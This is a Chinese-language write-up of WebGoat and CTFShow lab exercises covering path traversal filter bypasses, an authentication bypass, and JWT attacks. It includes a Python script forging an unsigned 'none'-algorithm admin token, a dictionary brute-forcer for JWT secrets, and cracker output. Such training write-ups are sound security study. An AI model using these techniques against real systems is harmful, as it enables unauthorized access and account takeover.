# WebGoat

## Path traversal

### 2

<img src="图片\Snipaste_2023-01-18_14-31-19.png" alt="Snipaste_2023-01-18_14-31-19" style="zoom:67%;" />

上传一个正常图片时，路径显示 

```
/home/webgoat/.webgoat-8.1.0/PathTraversal/adminzfy/test
```

我们要上传到指定路径

```
/home/webgoat/.webgoat-8.1.0/PathTraversal/
```

在 test 前加上 ../ 即可

<img src="图片\Snipaste_2023-01-18_14-35-12.png" alt="Snipaste_2023-01-18_14-35-12" style="zoom:67%;" />

找到源码，未做任何过滤

### 3

先按照上题的方法试试，没有成功

<img src="图片\Snipaste_2023-01-18_14-44-54.png" alt="Snipaste_2023-01-18_14-44-54" style="zoom:67%;" />

找到源码看看，原来是**单次过滤**了 **../**，把其替换为了空

<img src="图片\Snipaste_2023-01-18_14-45-54.png" alt="Snipaste_2023-01-18_14-45-54" style="zoom:67%;" />

我们直接双写 ../ 变为 ..././ 试试

<img src="图片\Snipaste_2023-01-18_14-48-10.png" alt="Snipaste_2023-01-18_14-48-10" style="zoom:67%;" />

### 4

正常上传图片后显示，它是使用的**原图片的文件名**

<img src="图片\Snipaste_2023-01-18_14-52-49.png" alt="Snipaste_2023-01-18_14-52-49" style="zoom:67%;" />

<img src="图片\Snipaste_2023-01-18_14-54-54.png" alt="Snipaste_2023-01-18_14-54-54" style="zoom:67%;" />

我们直接修改上传图片的文件名，在前面加上 ../ 试试

<img src="图片\Snipaste_2023-01-18_14-58-19.png" alt="Snipaste_2023-01-18_14-58-19" style="zoom:67%;" />

### 5

<img src="图片\Snipaste_2023-01-18_15-12-05.png" alt="Snipaste_2023-01-18_15-12-05" style="zoom:80%;" />

如果用户输入的id.jpg存在，那么返回包中返回该图片的base64编码

如果不存在，就返回catPicturesDirectory的父目录的所有文件信息，用逗号分割

https://www.cnblogs.com/HAN91/p/14585449.html

<img src="图片\Snipaste_2023-01-18_15-13-14.png" alt="Snipaste_2023-01-18_15-13-14" style="zoom:67%;" />

## Authentication Bypasses

`调用verificationHelper.didUserLikelylCheat()`

`将用户输入的问题用键值对的方式保存，并和后端代码存储的答案进行比较。`

`但是Mapper在get一个不存在的键时，并不会报错，而是返回null。所以用户可以通过控制key的值绕过`

我们**修改 key 为不存在的值**，即可绕过

<img src="图片\Snipaste_2023-01-18_15-19-45.png" alt="Snipaste_2023-01-18_15-19-45" style="zoom:67%;" />

## JWT

https://www.cnblogs.com/yokan/p/14468030.html

生成规则如下：

- 第一段HEADER部分，固定包含算法和token类型，对此json进行base64url加密，这就是token的第一段。

```
{` `  ``"alg"``: ``"HS256"``,` `  ``"typ"``: ``"JWT"` `}
```

- 第二段PAYLOAD部分，包含一些数据，对此json进行base64url加密，这就是token的第二段。

```
{` `  ``"sub"``: ``"1234567890"``,` `  ``"name"``: ``"John Doe"``,` `  ``"iat"``: 1516239022` `   ``...` `}
```

- 第三段SIGNATURE部分，把前两段的base密文通过`.`拼接起来，然后对其进行`HS256`加密，再然后对`hs256`密文进行base64url加密，最终得到token的第三段。

```
base64url(``   ``HMACSHA256(``       ``base64UrlEncode(header) + ``"."` `+ base64UrlEncode(payload),``       ``your-256-bit-secret (秘钥加盐)``   ``)``)
```

最后将三段字符串通过 `.`拼接起来就生成了jwt的token

### 空加密算法

把signature设置为空（即不添加signature字段），提交到服务器，任何token都可以通过服务器的验证，即不需要密匙。前提是开发人员在生产环境中开启了空加密算法

python生成空加密jwt

```python
# -*- coding:utf-8 -*-
import jwt
import base64
def b64urlencode(data):
    return base64.b64encode(data).replace(b'+', b'-').replace(b'/', b'_').replace(b'=', b'')
print(b64urlencode(b'{"alg":"none"}')+b'.'+b64urlencode(b'{"iat":1674890907,"admin":"true","user":"Tom"}')+b'.')
```

```
eyJhbGciOiJub25lIn0.eyJpYXQiOjE2NzQ4OTA5MDcsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.
```

修改 cookie 中 JWT 为 admin 则成功

### 爆破密匙

已知

```
eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY3NDAyNjU4NSwiZXhwIjoxNjc0MDI2NjQ1LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.kp8SVnSCJNXMm4vG22OlyEluvw2JzqlBJ-0ovMLSOJw
```

我们要 username changed to WebGoat

```python
import termcolor
import jwt
if __name__ == "__main__":
    jwt_str = 'eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTYxMTc5ODAxNSwiZXhwIjoxNjExNzk4MDc1LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.w1tzWDwmZcggbyV9ixcw1Vydf07MG9mAsPVbQPgBh2E'
    with open('pass.txt') as f:
        for line in f:
            key_ = line.strip()
            try:
                jwt.decode(jwt_str, verify=True, key=key_, algorithms="HS256")
                print('\r', '\bbingo! found key -->', termcolor.colored(key_, 'green'), '<--')
                break
            except (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):
                print('\r', '\bbingo! found key -->', termcolor.colored(key_, 'green'), '<--')
                break
            except jwt.exceptions.InvalidSignatureError:
                print('\r', ' ' * 64, '\r\btry', key_, end='', flush=True)
                continue
        else:
            print('\r', '\bsorry! no key be found.')
```

爆破出来key，就可以去https://jwt.io/#debugger 加工啦

# CTF SHOW

## web345

把 cookie 中的值 base64 解码

```
auth=eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2NzQwMzAzNDYsImV4cCI6MTY3NDAzNzU0NiwibmJmIjoxNjc0MDMwMzQ2LCJzdWIiOiJ1c2VyIiwianRpIjoiOWNiMDBkYzc0NDA5ODMwNmRhNmVlNTQzNGI1MzAxOWYifV0
```

```
{"alg":"None","typ":"jwt"}[{"iss":"admin","iat":1674030346,"exp":1674037546,"nbf":1674030346,"sub":"user","jti":"9cb00dc744098306da6ee5434b53019f"}]
```

把 user 改为 admin 再 base64 编码，替换cookie 则看到 flag

```
{"alg":"None","typ":"jwt"}[{"iss":"admin","iat":1674030346,"exp":1674037546,"nbf":1674030346,"sub":"admin","jti":"9cb00dc744098306da6ee5434b53019f"}]
```

```
eyJhbGciOiJOb25lIiwidHlwIjoiand0In0AW3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2NzQwMzAzNDYsImV4cCI6MTY3NDAzNzU0NiwibmJmIjoxNjc0MDMwMzQ2LCJzdWIiOiJhZG1pbiIsImp0aSI6IjljYjAwZGM3NDQwOTgzMDZkYTZlZTU0MzRiNTMwMTlmIn1d
```

<img src="图片\Snipaste_2023-01-18_16-36-26.png" alt="Snipaste_2023-01-18_16-36-26" style="zoom:80%;" />

## web346

猜测密匙为 123456 ，修改 user 为 admin

## web347

爆破

```
ubuntu@VM-4-8-ubuntu:~/c-jwt-cracker-master$ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY3NDAzNDcxNywiZXhwIjoxNjc0MDQxOTE3LCJuYmYiOjE2NzQwMzQ3MTcsInN1YiI6InVzZXIiLCJqdGkiOiI4YmE5YTU1ODhjODM2ZGI3MzFiOWViZDc2NjRhOGExNSJ9.YD1U0kSu9OL2JOMPTG_eyCSy7ibYiJSWswObR2_VIHM

Secret is "aaab"
```

